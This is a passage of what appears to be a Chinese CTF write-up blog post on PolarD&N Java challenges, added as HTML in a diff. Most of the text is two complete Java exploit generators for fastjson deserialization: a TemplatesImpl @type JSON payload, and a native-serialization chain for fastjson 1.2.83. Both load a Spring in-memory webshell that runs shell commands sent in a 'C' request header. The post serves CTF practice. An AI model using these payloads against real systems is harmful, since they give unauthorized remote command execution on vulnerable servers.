+<p>没任何限制 直接通了</p>
+<p>EXP如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">run</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">clas</span> <span class="hljs-operator">=</span> genPayloadForLinux();<br><br>            <span class="hljs-type">byte</span>[] evilCode = clas.toBytecode();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode_base64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(evilCode);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">text1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span>+<br>                    <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<span class="hljs-string">&quot;\&quot;,&quot;</span>+<br>                    <span class="hljs-string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode_base64+<span class="hljs-string">&quot;\&quot;],&quot;</span>+<br>                    <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;a.b\&quot;,&quot;</span>+<br>                    <span class="hljs-string">&quot;\&quot;_tfactory\&quot;:&#123;&#125;,&quot;</span>+<br>                    <span class="hljs-string">&quot;\&quot;_outputProperties\&quot;:&#123;&#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;\n&quot;</span>;<br><br>            System.out.println(text1);<br><br>            <span class="hljs-comment">// Object obj = JSON.parseObject(text1, Object.class, Feature.SupportNonPublicField);</span><br>        &#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass <span class="hljs-title function_">genPayloadForLinux</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>            clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>        &#125;<br>        clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public B() throws Exception &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String[] cmd =  new String[]&#123;\&quot;sh\&quot;, \&quot;-c\&quot;, httprequest.getHeader(\&quot;C\&quot;)&#125;;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br>        <span class="hljs-comment">// 兼容低版本jdk</span><br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/polarctf/17447086176816.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ezJson"><a href="#ezJson" class="headerlink" title="ezJson"></a>ezJson</h2><p>fastjson 1.2.83<img src="/img/polarctf/17453957799778.png" srcset="/img/loading.gif" lazyload><br>没做任何限制 直接尝试打fastjson全版本原生反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">run</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> genPayloadForLinux();<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;jed&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, jsonArray);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates, val);<br>        <br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(outputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(outputStream.toByteArray());<br>        System.out.println(payload);<br>        System.out.println(payload.length());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object fieldValue)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">classField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        classField.setAccessible(<span class="hljs-literal">true</span>);<br>        classField.set(obj, fieldValue);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass <span class="hljs-title function_">genPayloadForLinux</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>            clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>        &#125;<br>        clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public B() throws Exception &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String[] cmd =  new String[]&#123;\&quot;sh\&quot;, \&quot;-c\&quot;, httprequest.getHeader(\&quot;C\&quot;)&#125;;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br>        <span class="hljs-comment">// 兼容低版本jdk</span><br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>POST传参记得URL特殊编码 忘记编码我还愣了一会<br><img src="/img/polarctf/17453972555765.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/writeup/" class="print-no-link">#writeup</a>
+      
+        <a href="/tags/Java/" class="print-no-link">#Java</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PolarD&amp;N Java专题</div>
+      <div>http://example.com/2025/04/23/JAVA_Problem/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Jednersaous</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/17/Java%20RMI%E5%88%86%E6%9E%90/" title="Java RMI分析">
+                        <span class="hidden-mobile">Java RMI分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
